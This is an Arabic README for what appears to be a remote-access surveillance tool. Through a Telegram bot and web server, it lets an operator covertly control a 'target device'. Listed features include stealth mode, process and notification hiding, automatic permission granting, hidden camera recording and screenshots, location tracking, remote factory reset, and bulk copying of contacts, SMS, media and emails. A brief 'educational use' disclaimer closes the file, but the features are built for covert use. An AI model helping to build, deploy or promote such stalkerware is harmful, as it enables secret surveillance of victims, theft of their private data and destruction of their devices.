# 🎯 نظام التحكم في الأجهزة - النسخة المحسنة

## 📋 نظرة عامة

نظام متقدم للتحكم في الأجهزة عن بعد مع ميزات التخفي والأمان المتقدمة. يوفر التحكم الكامل في الأجهزة المستهدفة من خلال واجهة ويب وبوت تيليجرام.

## ✨ الميزات الجديدة

### 🔒 الأمان والتخفي
- **تشفير متقدم**: جميع الاتصالات مشفرة بـ AES-256
- **وضع التخفي**: يعمل في الخلفية بدون إشعارات
- **حماية من DDoS**: حماية متقدمة من الهجمات
- **مصادقة متعددة المستويات**: تحقق من الهوية والصلاحيات
- **تتبع النشاط**: سجل مفصل لجميع العمليات

### 🚀 الوظائف المحسنة
- **منح الصلاحيات التلقائي**: منح جميع الصلاحيات المطلوبة
- **نسخ احتياطي شامل**: جهات الاتصال، الرسائل، الوسائط، الإيميلات
- **تسجيل الفيديو**: تسجيل الكاميرا بدون واجهة
- **لقطات الشاشة**: التقاط لقطات شاشة مخفية
- **تتبع الموقع**: الحصول على الموقع الدقيق
- **مراقبة التطبيقات**: معرفة التطبيقات النشطة
- **إعادة ضبط المصنع**: التحكم الكامل في الجهاز

### 🛠️ التحسينات التقنية
- **WebSocket محسن**: اتصال مستقر وسريع
- **قاعدة بيانات SQLite**: تخزين آمن ومنظم
- **معالجة الأخطاء**: معالجة شاملة للأخطاء
- **إعادة الاتصال التلقائي**: استعادة الاتصال عند الانقطاع
- **ضغط البيانات**: تحسين سرعة النقل

## 🏗️ هيكل النظام

```
remote-control-system/
├── web-interface/          # واجهة الويب
│   ├── public/            # الملفات العامة
│   ├── templates/         # قوالب السكريبتات
│   ├── data/             # بيانات الأجهزة
│   └── server.js         # خادم الواجهة
├── command-server/        # خادم التحكم
│   ├── data/             # قاعدة البيانات
│   ├── uploads/          # الملفات المحملة
│   └── server.js         # خادم التحكم
├── telegram-bot/          # بوت تيليجرام
│   ├── bot.py           # البوت الرئيسي
│   └── requirements.txt  # تبعيات Python
├── device-scripts/        # سكريبتات الأجهزة
│   ├── main-controller.js
│   ├── permission-granter.js
│   ├── backup-module.js
│   ├── camera-module.js
│   └── system-module.js
├── database/             # قاعدة البيانات
├── logs/                # ملفات السجل
├── start.sh             # سكريبت التشغيل
├── stop.sh              # سكريبت الإيقاف
└── README.md            # هذا الملف
```

## 🚀 التثبيت والتشغيل

### المتطلبات الأساسية
- **Node.js** 16 أو أحدث
- **Python** 3.8 أو أحدث
- **npm** و **pip3**

### خطوات التثبيت

1. **استنساخ المشروع**
```bash
git clone <repository-url>
cd remote-control-system
```

2. **تشغيل النظام**
```bash
./start.sh
```

3. **إيقاف النظام**
```bash
./stop.sh
```

### الإعداد الأولي

1. **تحديث رمز البوت**
   - افتح `telegram-bot/bot.py`
   - استبدل `YOUR_BOT_TOKEN` برمز البوت الحقيقي

2. **تحديث معرف المستخدم**
   - في `telegram-bot/bot.py`، ابحث عن `user_id=123456789`
   - استبدل برقم معرف المستخدم الحقيقي

3. **تخصيص إعدادات الأمان**
   - افتح ملف `.env` الذي تم إنشاؤه
   - عدّل الإعدادات حسب الحاجة

## 📱 كيفية الاستخدام

### 1. ربط جهاز جديد
1. افتح بوت تيليجرام
2. أرسل `/link`
3. احصل على كود التفعيل
4. افتح `http://localhost:3000` على الجهاز المستهدف
5. أدخل كود التفعيل

### 2. التحكم في الأجهزة
- `/devices` - عرض الأجهزة المرتبطة
- `/contacts` - نسخ جهات الاتصال
- `/sms` - نسخ الرسائل النصية
- `/media` - نسخ الوسائط
- `/location` - الحصول على الموقع
- `/record` - تسجيل الفيديو
- `/screenshot` - لقطة شاشة
- `/reset` - إعادة ضبط المصنع

## 🔧 الإعدادات المتقدمة

### متغيرات البيئة
```bash
# إعدادات النظام
NODE_ENV=production
LOG_LEVEL=info
STEALTH_MODE=true
SECURITY_MODE=true

# إعدادات الخوادم
WEB_INTERFACE_PORT=3000
COMMAND_SERVER_PORT=4000

# إعدادات البوت
TELEGRAM_BOT_TOKEN=your-bot-token
ADMIN_USER_ID=your-user-id

# إعدادات الأمان
ADMIN_TOKEN=your-admin-token
ENCRYPTION_KEY=your-32-char-key
```

### تخصيص الأمان
- **تغيير مفاتيح التشفير**: عدّل `ENCRYPTION_KEY`
- **تخصيص حد الطلبات**: عدّل `max_requests_per_window`
- **إضافة مستخدمين مصرح لهم**: أضف في `authorized_users`

## 🛡️ ميزات الأمان

### التشفير
- **AES-256-CBC**: تشفير جميع البيانات
- **HMAC**: التحقق من سلامة البيانات
- **TLS/SSL**: تشفير الاتصالات

### الحماية
- **Rate Limiting**: منع هجمات DDoS
- **Input Validation**: التحقق من المدخلات
- **SQL Injection Protection**: حماية قاعدة البيانات
- **XSS Protection**: منع هجمات XSS

### التخفي
- **Background Execution**: تشغيل في الخلفية
- **Hidden Notifications**: إخفاء الإشعارات
- **Stealth Mode**: وضع التخفي الكامل
- **Process Hiding**: إخفاء العمليات

## 📊 المراقبة والسجلات

### ملفات السجل
- `logs/web-interface.log` - سجل واجهة الويب
- `logs/command-server.log` - سجل خادم التحكم
- `logs/telegram-bot.log` - سجل بوت تيليجرام

### قاعدة البيانات
- `data/devices.json` - بيانات الأجهزة
- `data/commands.json` - سجل الأوامر
- `data/activity_log.json` - سجل النشاط

## 🔄 الصيانة والتحديث

### النسخ الاحتياطي
```bash
# نسخ احتياطي للبيانات
cp -r data/ backup/data_$(date +%Y%m%d_%H%M%S)/
cp -r logs/ backup/logs_$(date +%Y%m%d_%H%M%S)/
```

### التحديث
```bash
# إيقاف النظام
./stop.sh

# تحديث الكود
git pull

# إعادة التشغيل
./start.sh
```

## ⚠️ تحذيرات مهمة

### الاستخدام القانوني
- **استخدم هذا النظام فقط على أجهزتك الخاصة**
- **احترم خصوصية الآخرين**
- **لا تستخدم لأغراض ضارة أو غير قانونية**

### الأمان
- **احتفظ بمفاتيح التشفير آمناً**
- **لا تشارك رموز البوت مع أحد**
- **راجع السجلات بانتظام**

### الأداء
- **راقب استخدام الذاكرة والمساحة**
- **نظف الملفات القديمة بانتظام**
- **أعد تشغيل النظام دورياً**

## 🆘 استكشاف الأخطاء

### مشاكل شائعة

1. **البوت لا يستجيب**
   - تحقق من صحة رمز البوت
   - تأكد من تشغيل الخادم

2. **الأجهزة لا تتصل**
   - تحقق من إعدادات الشبكة
   - تأكد من تشغيل خادم التحكم

3. **الأوامر لا تعمل**
   - تحقق من صلاحيات الجهاز
   - راجع سجلات الأخطاء

### الحصول على المساعدة
- راجع ملفات السجل في مجلد `logs/`
- تحقق من حالة الخوادم
- أعد تشغيل النظام

## 📄 الترخيص

هذا المشروع مرخص تحت رخصة MIT. راجع ملف `LICENSE` للتفاصيل.

## 🤝 المساهمة

نرحب بالمساهمات! يرجى:
1. Fork المشروع
2. إنشاء فرع للميزة الجديدة
3. Commit التغييرات
4. Push للفرع
5. إنشاء Pull Request

## 📞 الدعم

للحصول على الدعم:
- افتح Issue في GitHub
- راجع الوثائق
- تحقق من ملفات السجل

---

**⚠️ تحذير**: هذا النظام للأغراض التعليمية والبحثية فقط. استخدمه بمسؤولية واحترام خصوصية الآخرين.